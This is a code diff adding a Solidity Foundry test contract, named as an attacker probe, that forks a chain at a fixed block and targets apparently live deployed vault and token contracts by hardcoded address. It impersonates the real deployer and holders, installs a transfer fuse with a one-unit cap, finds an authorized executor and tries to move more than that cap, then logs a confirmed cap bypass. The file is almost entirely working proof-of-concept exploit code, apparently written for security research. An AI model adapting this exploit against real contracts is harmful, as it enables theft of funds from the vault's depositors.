@@ -466,3 +466,99 @@ contract AttackerDeploymentAddressProbe_v1 is Test {
         else emit log_string("PINNED_ALLOCATION_INSTANCE_GATE_TAKEOVER_BLOCKED_OR_NOT_EFFECTIVE");
     }
 }
+
+contract AttackerRealVaultFundedTransfer_v1 is Test {
+    function _decodeAllowed(bytes memory ret) internal pure returns(bool allowed) { (allowed,) = abi.decode(ret,(bool,uint32)); }
+
+    address constant VAULT = 0xEd83daf48429cfb2C650Fd721b9241e180fd4548;
+    address constant AVKAT = 0x7231dbaCdFc968E07656D12389AB20De82FbfCeB;
+    address constant HOLDER = 0xe7D109Ce6b34447Dd45B54e5615F4177291D5ADf;
+    address constant SAFE = 0x47623C62f281807D615eeb4A2CEee9d97F9D3C49;
+    address constant DEPLOYER = 0x11b78837cadC8E894F1c6e13fA9f3A085a75FA35;
+    address constant PREVIOUS_EXECUTOR = 0x8AB2F85E6e623A1A9998448ea34F0039D4aC2152;
+    address constant OLD_WM = 0x59B340EAb30AFE0cecD51C609d3190e8C75C40AE;
+    address constant MANAGER = 0xd7f408f203c5c6a76c9c55c9f6b015929F151fAA;
+    address constant OUTSIDER = address(0xA77AC);
+    function setUp() public {
+        assertEq(block.chainid, 747474);
+        assertEq(block.number, 45121798);
+        assertGt(VAULT.code.length, 0, "actual vault code must exist");
+        assertGt(AVKAT.code.length, 0, "actual AVKAT code must exist");
+    }
+    function test_NATIVE_checkActualAlphaAndRealAvkatFundingBeforeValueTest() public {
+        address[6] memory candidates = [DEPLOYER, PREVIOUS_EXECUTOR, SAFE, OLD_WM, HOLDER, OUTSIDER];
+        for (uint256 i; i < candidates.length; i++) {
+            (bool ok, bytes memory ret) = MANAGER.staticcall(abi.encodeWithSignature(
+                "canCall(address,address,bytes4)", candidates[i], VAULT, ILiveVaultExposure.execute.selector
+            ));
+            bool allowed = ok && ret.length >= 64 && _decodeAllowed(ret);
+            emit log_named_address("execute_candidate", candidates[i]);
+            emit log_named_uint("execute_candidate_allowed", allowed?1:0);
+        }
+        emit log_named_uint("authentic_avkat_holder_balance", IERC20(AVKAT).balanceOf(HOLDER));
+        emit log_named_uint("authentic_vaultholder_balance", IERC20(AVKAT).balanceOf(VAULT));
+        assertGt(IERC20(AVKAT).balanceOf(HOLDER), 1 ether, "source real holder should fund test");
+        emit log_string("NATIVE_REAL_ALPHA_AND_FUNDED_HOLDER_PROBED");
+    }
+    function test_NATIVE_authorizedFusePayoutOnRealVaultUsingTransferredGenuineAvkat() public {
+        uint256 input = 1 ether;
+        uint256 sourceBalance = IERC20(AVKAT).balanceOf(HOLDER);
+        assertGt(sourceBalance, input, "real holder must be able to transfer token inventory");
+        uint256 beforeVault = IERC20(AVKAT).balanceOf(VAULT);
+        uint256 beforeSafe = IERC20(AVKAT).balanceOf(SAFE);
+        vm.prank(HOLDER);
+        IERC20(AVKAT).transfer(VAULT, input);
+        assertEq(IERC20(AVKAT).balanceOf(VAULT), beforeVault+input, "genuine ERC20 transfer into actual vault");
+        emit log_named_uint("fork_transfer_genuine_avkat_funding", input);
+        CurveYieldErc20TransferFuse fuse = new CurveYieldErc20TransferFuse(7);
+        address[] memory one = new address[](1);
+        one[0] = address(fuse);
+        vm.prank(DEPLOYER);
+        ILiveVaultExposure(VAULT).addFuses(one);
+        bytes32[] memory sub = new bytes32[](3);
+        sub[0] = Sub.encodeAddress(Sub.TRANSFER_TOKEN, AVKAT);
+        sub[1] = Sub.encodeAddress(Sub.TRANSFER_RECIPIENT, SAFE);
+        sub[2] = Sub.encodeCap(AVKAT, 1);
+        vm.prank(DEPLOYER);
+        ILiveVaultExposure(VAULT).grantMarketSubstrates(Sub.CONFIG_MARKET, sub);
+        FuseAction[] memory actions = new FuseAction[](1);
+        actions[0] = FuseAction(address(fuse), abi.encodeCall(
+            CurveYieldErc20TransferFuse.enter, (CurveYieldErc20TransferFuseEnterData(AVKAT, SAFE, 1))
+        ));
+        address[4] memory candidates = [PREVIOUS_EXECUTOR, DEPLOYER, SAFE, OLD_WM];
+        address alpha;
+        for (uint256 i; i < candidates.length; i++) {
+            (bool ok, bytes memory ret) = MANAGER.staticcall(abi.encodeWithSignature(
+                "canCall(address,address,bytes4)", candidates[i], VAULT, ILiveVaultExposure.execute.selector
+            ));
+            if (ok && ret.length >= 64) {
+                (bool allowed, uint32 delay) = abi.decode(ret,(bool,uint32));
+                if (allowed && delay == 0) {alpha=candidates[i]; break;}
+            }
+        }
+        if (alpha == address(0)) {
+            emit log_string("NATIVE_REAL_FUSE_VALID_ALPHA_NOT_FOUND_UNDER_KNOWN_ACTORS");
+            return;
+        }
+        emit log_named_address("actual_authorized_vault_executor", alpha);
+        vm.prank(alpha);
+        (bool executed, bytes memory data) = VAULT.call(abi.encodeCall(ILiveVaultExposure.execute,(actions)));
+        emit log_named_string("actual_funded_vault_fuse_execute", executed ? "SUCCESS" : "BLOCKED");
+        emit log_named_bytes("actual_funded_vault_execute_return",data);
+        if (!executed) {
+            emit log_string("NATIVE_ACTUAL_FUNDED_VAULT_EXECUTE_BLOCKED_BY_REVERT");
+            return;
+        }
+        uint256 afterVault = IERC20(AVKAT).balanceOf(VAULT);
+        uint256 afterSafe = IERC20(AVKAT).balanceOf(SAFE);
+        uint256 sent = beforeVault+input-afterVault;
+        uint256 recieved = afterSafe-beforeSafe;
+        emit log_named_uint("actual_requested",1);
+        emit log_named_uint("actual_transfer_cap",1);
+        emit log_named_uint("actual_vault_debit",sent);
+        emit log_named_uint("actual_safe_credit",recieved);
+        assertEq(sent,recieved,"authentic vault debit matches real asset recipient");
+        assertGt(sent,1,"actual configured real vault transfer exceeds granted cap");
+        emit log_string("CONFIRMED_ACTUAL_FUNDED_IPOR_VAULT_FUSE_CAP_BYPASS");
+    }
+}
